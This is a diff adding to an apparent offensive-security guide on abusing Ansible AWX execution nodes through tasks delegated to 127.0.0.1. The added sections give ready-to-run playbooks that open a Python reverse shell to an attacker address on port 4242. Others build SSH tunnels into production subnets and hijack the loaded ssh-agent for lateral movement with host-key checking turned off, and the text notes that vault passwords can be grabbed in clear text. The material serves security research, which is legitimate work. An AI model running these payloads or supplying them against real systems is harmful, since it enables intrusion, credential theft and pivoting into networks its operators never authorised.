@@ -379,12 +379,86 @@ Here is an exemple of a delegated task:
 ```
 
 This would cause the second task to run on `host-1`, all other tasks will be executed on the target hosts.
+Using this delegation method, we can execute arbitrary commands on the execution node.
+From there, one can perform enumeration of project artifacts and sometimes grab secrets like vault passwords, that are sent in clear text.
 
-When a `job_template` is launched, a new pod is created by `awx-operator`, then the context of the execution is sent to this pod and the `machine id` credential is configured in the local SSH-Agent.
-This pod is called the **execution node**, after all of the setup is done, the execution of the playbook begins.
+Interesting pivoting techniques are possible if the `machine id` uses an SSH key for authenticaton.
+This is because, when a `job_template` is launched, a new pod is created by `awx-operator`, the context of the execution is sent to this pod and the `machine id` credential is configured in the local `ssh-agent`.
+
+Here is what that command looks like: 
+
+```bash
+sh-ctrap 'rm -f /runner/artifacts/<id>/ssh_key_data' EXIT \ 
+    && ssh-add /runner/artifacts/<id>/ssh_key_data \
+    && rm -f /runner/artifacts/<id>/ssh_key_data \
+    && ansible-playbook -u <user> -v \
+            -i /runner/inventory/hosts \
+            -e @/runner/env/extravars playbook.yml
+```
+It starts by trapping a deletion of the key on the `EXIT` signal, this way the key is instantly deleted at the end even if the command fails.
+Afterwards, the key is added to the agent and finally, the playbook is launched.
 
 Therefore, by delegating a task to `127.0.0.1`, we can target the execution node and stop the playbook in its tracks.
-Since the SSH-Agent is already configured and any password or passphrase needed has been given, we can use ssh commands directly.
+Since the `ssh-agent` is already configured and any passphrase needed has been given, we can use ssh commands directly.
+Some techniques leveraging this will be detailed below.
+
+### Obtaining a reverse shell
+
+The execution nodes are pretty slim environments.
+Therefore, most of the usual suspects that are normally used to gain a shell on a linux system are not present.
+
+However, we can use the execution node's python interpreter to send ourselves a reverse shell.
+There are multiple ways to deliver such a payload, here are two ways.
+
+It is possible to use a call to `ansible.module.shell` to launch bash command which will in turn launch a python reverse shell.
+Here is what that looks like :
+
+```yml
+---
+
+- name: "Execution node command execution"
+  gather_facts: true
+  hosts: all
+  tasks:
+    - ansible.builtin.shell: |
+         python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.100',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
+      delegate_to: 127.0.0.1
+      register: stdout
+
+    - ansible.builtin.debug:
+        var: stdout
+
+```
+
+You could also execute python code directly containing a reverse shell.
+To do that, we can use the `ansible.module.shell` module again, but specify python3 as the interpreter.
+
+```yml
+---
+
+- name: "Execution node python script execution"
+  gather_facts: true
+  hosts: all
+  tasks:
+    - ansible.builtin.shell: |
+         import socket,os,pty
+         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+         s.connect(('10.0.0.100',4242))
+         os.dup2(s.fileno(),0)
+         os.dup2(s.fileno(),1)
+         os.dup2(s.fileno(),2)
+         pty.spawn('/bin/sh')
+      args:
+        executable: /usr/bin/python3
+      delegate_to: 127.0.0.1
+      register: stdout
+
+    - ansible.builtin.debug:
+        var: stdout
+```
+
+This should return send us a reverse shell and we skipped spawning a bash shell before hand.
+Example playbooks allowing you to prompt which command or python code is executed on launch are available in the `playbooks/` directory at the root of this repository.
 
 ### Tunneling
 
@@ -392,25 +466,26 @@ Using this we can create SSH tunnels between hosts, this can be useful for pivot
 Here is an example that assumes a certain level of segregation between the dev and prod environments.
 However, the AWX instance is used to manage both subnets, without proper segregation.
 
-```bash
+```yml
 ---
 - name: tunnel
   hosts: all 
   tasks:
     - name: 
       ansible.builtin.shell: |
-         ssh -R 9999:prod-host:25 dev-host -N
+         ssh -o StrictHostKeyChecking=no -R 9999:prod-host:25 user@dev-host -N
       delegate_to: 127.0.0.1 
 
 ```
 > You can add `-f` flag to the SSH command to background it instantly.
+> The `-o StrictHostKeyChecking=no` flag disabled host verification to avoid issues, relating to that while pivoting.
 
 In this case, an attacker could forward a production host's port to a machine in the dev subnet that they can reach.
 We used SMTP as an example.
 
 ### Lateral movement
 
-Using this, we can also hijack the SSH-Agent to connect to a host we would normally not be able to interact with through AWX.  
+Using this, we can also hijack the `ssh-agent` to connect to a host we would normally not be able to interact with through AWX.  
 This does depends on a reuse of credentials (SSH key or password) to be exploitable, but it happens often in larger environments.  
 
 Assuming we have an inventory containing only `host-1`, and we do not have the rights to modify it.
@@ -418,16 +493,17 @@ There is a second host called `host-2` to which we want to connect, but we have 
 
 Here is an example that leverages this technique to pivot on `host-2` :
 
-```bash
+```yml
 ---
 - name: execute commands on host-2
   hosts: all 
   tasks:
     - name: 
       ansible.builtin.shell: |
-        ssh host-2 -- [...]
+        ssh -o StrictHostKeyChecking=no user@host-2 -- [...]
       delegate_to: 127.0.0.1 
 ```
+> The `-o StrictHostKeyChecking=no` flag disabled host verification to avoid issues relating to that while pivoting.
 
 ### Paramiko
 
@@ -437,7 +513,7 @@ This library is an implementation of the SSHv2 protocol in pure python, both cli
 
 This can be used to bypass certain mitigations that could have been made to the SSH server of execution nodes. 
 Since the SSH daemon will never be contacted by our Paramiko script, we can bypass the hardened configurations of the SSH daemon.
-The Paramiko library is also able to interact with the SSH-Agent directly and connect to hosts using its keys.
+The Paramiko library is also able to interact with the `ssh-agent` directly and connect to hosts using its keys.
 
 Here is an example of using paramiko inline in a playbook :
 
